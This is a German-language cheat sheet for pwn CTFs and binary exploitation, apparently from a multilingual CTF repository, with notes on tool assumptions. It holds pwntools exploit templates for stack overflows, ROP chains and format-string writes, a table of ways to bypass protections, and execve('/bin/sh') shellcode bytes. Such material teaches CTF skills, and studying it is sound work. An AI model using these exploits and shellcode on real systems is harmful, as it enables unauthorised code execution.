# 💥 Spickzettel für Pwn-CTFs und Binary Exploitation

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Pwn-CTF.tr.md) • [🇬🇷 Ελληνικά](Pwn-CTF.el.md)

---

## 🔍 Erste Analyse

```bash
# Schutzmechanismen prüfen
checksec binary

# Dateiinformationen
file binary
ldd binary        # Bibliotheken

# Programm starten
./binary
ltrace ./binary   # Bibliotheksaufrufe
strace ./binary   # Systemaufrufe
```

---

## 🛡️ Schutzmechanismen

| Schutzmechanismus | Beschreibung | Umgehung |
|------------|-------------|--------|
| **NX** | Nicht ausführbarer Stack | ROP |
| **ASLR** | Zufällige Speicheradressen | Adresse offenlegen und Zieladresse berechnen |
| **PIE** | Zufällige Basisadresse des Programms | Programm-Adresse offenlegen |
| **Canary** | Prüfwert auf dem Stack (Stack Canary) | Canary-Wert offenlegen |
| **RELRO** | Schutz der Global Offset Table (GOT) | Andere Techniken verwenden |

---

## 📏 Buffer Overflow

### Offset ermitteln
```bash
# Mit pwntools
cyclic 200        # Muster erzeugen
cyclic -l 0x6161616a  # Offset ermitteln

# Mit GDB
pattern create 200
pattern offset 0x6161616a
```

### Einfaches Exploit-Beispiel (pwntools)
```python
from pwn import *

p = process('./binary')
# p = remote('host', port)

offset = 64
payload = b'A' * offset
payload += p64(0xdeadbeef)  # Rücksprungadresse

p.sendline(payload)
p.interactive()
```

---

## 🔗 ROP (Return Oriented Programming)

### Gadgets finden
```bash
ROPgadget --binary binary
ropper -f binary

# Häufige Gadgets
pop rdi; ret
pop rsi; pop r15; ret
ret                  # Für die Stack-Ausrichtung
```

### ROP-Kette (pwntools)
```python
from pwn import *

elf = ELF('./binary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(elf)

# Kette aufbauen
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.call(elf.symbols['main'])

payload = b'A' * offset + rop.chain()
```

---

## 🐚 Shellcode

### 64-Bit-Linux
```python
# pwntools shellcraft
shellcode = asm(shellcraft.sh())

# Manuell
# execve("/bin/sh", NULL, NULL)
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
```

---

## 📚 Format-String-Schwachstellen

```bash
# Werte offenlegen
%p %p %p %p %p
%x %x %x %x %x

# Schreiben
%n - Anzahl der ausgegebenen Bytes schreiben
%hhn - ein Byte schreiben
```

```python
# pwntools fmtstr
from pwn import *
fmtstr_payload(offset, {target_addr: value})
```

---

## 🛠️ Werkzeuge

| Werkzeug | Verwendung |
|------|-----|
| **pwntools** | Python-Bibliothek für Binary Exploitation |
| **GDB + GEF** | Fehlersuche (Debugging) |
| **ROPgadget** | ROP-Gadgets finden |
| **one_gadget** | One-Shot-Gadgets in libc finden |
| **checksec** | Schutzmechanismen prüfen |

---

## 📋 Checkliste für Pwn-CTFs

```markdown
□ checksec binary
□ Schwachstelle finden (Overflow, Format String)
□ Offset berechnen
□ Schutzmechanismen prüfen
□ Exploit aufbauen (Shellcode/ROP)
□ Lokal testen
□ Für das entfernte Ziel anpassen
```

---

**Zurück zu CTF:** [🏁 CTF-Übersicht](./README.de.md)

---

## Hinweise zur deutschen Ausgabe

> **Architektur und Vollständigkeit:** `p64` und die angegebene libc-Datei setzen ein passendes 64-Bit-Ziel voraus. Die Überschrift „64-Bit-Linux“ konfiguriert pwntools nicht: Für `asm(shellcraft.sh())` muss der Architekturkontext passen; der dokumentierte Standard ist i386. Das ROP-Beispiel setzt `offset` voraus, baut nur eine Payload und sendet sie nicht. `target_addr`, `value`, `0xdeadbeef` und die Offsetwerte sind vorausgesetzte beziehungsweise beispielhafte Werte. [pwntools: Kontext](https://docs.pwntools.com/en/stable/context.html).

> **Werkzeuge und Schutzmechanismen:** `pattern create` und `pattern offset` sind keine allgemein verfügbaren GDB-Grundbefehle; entsprechende Erweiterungen und deren Syntax werden vorausgesetzt. GEF dokumentiert heute `pattern search` zur Offsetsuche. Die Zeilen mit `pop`/`ret` sind Assembler-Gadgets, keine Shell-Befehle; die Zeilen mit `%n` und `%hhn` beschreiben Format-Spezifizierer. Die Schutztabelle ist eine vereinfachte Übersicht und keine Garantie einer erfolgreichen Umgehung. [GEF: pattern](https://hugsy.github.io/gef/commands/pattern/).
